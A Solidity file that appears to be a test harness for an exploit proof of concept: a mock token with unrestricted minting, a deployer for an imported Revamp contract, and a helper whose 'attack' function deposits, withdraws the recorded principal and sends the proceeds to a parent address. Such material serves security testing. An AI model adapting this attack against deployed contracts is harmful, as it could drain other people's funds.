// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Revamp.sol";

contract MockToken {
    string public constant name = "Listed asset";
    string public constant symbol = "LST";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { _move(msg.sender,to,amount); return true; }
    function transferFrom(address from,address to,uint256 amount) external returns (bool) { uint256 a=allowance[from][msg.sender]; require(a>=amount,"allowance"); if(a!=type(uint256).max) allowance[from][msg.sender]=a-amount; _move(from,to,amount); return true; }
    function _move(address from,address to,uint256 amount) internal { require(balanceOf[from]>=amount,"balance"); balanceOf[from]-=amount; balanceOf[to]+=amount; }
}

contract RevampHelper {
    Revamp public immutable revamp;
    MockToken public immutable token;
    address payable public immutable parent;
    constructor(address revamp_,address token_,address payable parent_) { revamp=Revamp(payable(revamp_)); token=MockToken(token_); parent=parent_; }
    function attack(uint256 contribution) external payable {
        require(msg.sender==parent && msg.value==contribution,"bad caller/value");
        token.approve(address(revamp),type(uint256).max);
        revamp.revamp{value: contribution}(address(token),1 ether,parent);
        (uint256 principal,,)=revamp.users(address(this));
        revamp.withdraw(principal);
        (bool ok,)=parent.call{value:address(this).balance}(""); require(ok,"return");
    }
    receive() external payable {}
}

contract RevampDeployer {
    address public target;
    constructor(address token) {
        Revamp r = new Revamp(0,msg.sender,0,0,msg.sender,0,msg.sender,token,0,0,msg.sender);
        target = address(r);
    }
}
